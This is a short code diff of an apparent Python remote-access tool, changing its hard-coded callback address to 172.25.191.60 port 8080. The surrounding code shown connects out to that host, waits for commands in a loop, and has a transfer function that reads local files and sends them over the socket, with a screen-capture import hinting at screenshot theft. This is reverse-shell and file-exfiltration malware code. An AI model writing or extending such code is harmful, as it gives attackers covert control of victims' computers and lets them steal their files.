@@ -9,6 +9,9 @@ import shutil
 from PIL import ImageGrab
 import tempfile
 
+ip = "172.25.191.60"
+port = 8080
+
 def transfer(s, path):
     if os.path.exists(path):
         f = open (path, 'rb')
@@ -24,7 +27,7 @@ def transfer(s, path):
 
 def connecting():
     s = socket.socket()
-    s.connect(("192.168.56.101", 8080))
+    s.connect((ip, port))
 
     while True:
         command = s.recv(5000)
